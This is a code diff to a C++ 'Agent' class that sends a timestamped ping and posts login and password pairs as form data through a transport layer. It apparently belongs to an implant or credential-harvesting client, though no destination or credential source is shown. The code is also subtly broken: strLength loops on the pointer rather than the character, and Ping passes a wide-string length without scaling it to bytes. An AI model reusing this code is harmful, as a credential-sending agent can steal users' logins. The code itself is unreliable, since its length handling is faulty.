@@ -3,13 +3,15 @@
 #include "transport.h"
 #include "agent.h"
 
+
+
 inline auto strLength(char* str) {
 	unsigned size = 0;
 	for (char* s = str; s; s++, size++);
 	return size;
 }
 
-Agent::Agent(Transport *tr): transport(tr) {}
+Agent::Agent(Transport* tr) : transport(tr) {}
 Agent::Agent() { transport = NULL; }
 
 void Agent::SetTransport(Transport* tr) {
@@ -31,17 +33,21 @@ void Agent::ClearBuffer(void* buffer, size_t len) noexcept {
 
 int Agent::Ping() {
 	std::time_t currentTime;
-	std::stringstream ss;
+	std::wstringstream ss;
 	time(&currentTime);
 	ss << currentTime;
 
-	std::string stringTime{ ss.str() };
-	return transport->SendData(LPVOID(stringTime.c_str()), stringTime.length(), RAW_DATA);
+	std::wstring postData{
+		L"time=" + ss.str()
+	};
+	return transport->SendData(LPVOID(postData.c_str()), postData.length(), RAW_DATA);
 }
 
 int Agent::SendCreds(const std::wstring &login, const std::wstring &password) const noexcept{
-	std::wstring postData{
-		L"login=" + login + L"password=" + password
+	std::wstring postData = {
+		L"login=" + login + L"&password=" + password
 	};
-	return transport->SendData(LPVOID(postData.c_str()), postData.length() * sizeof(wchar_t), X_WWW_FORM);
+	auto res = transport->SendData(LPVOID(postData.c_str()),
+		postData.length() * sizeof(wchar_t), X_WWW_FORM);
+	return res;
 }
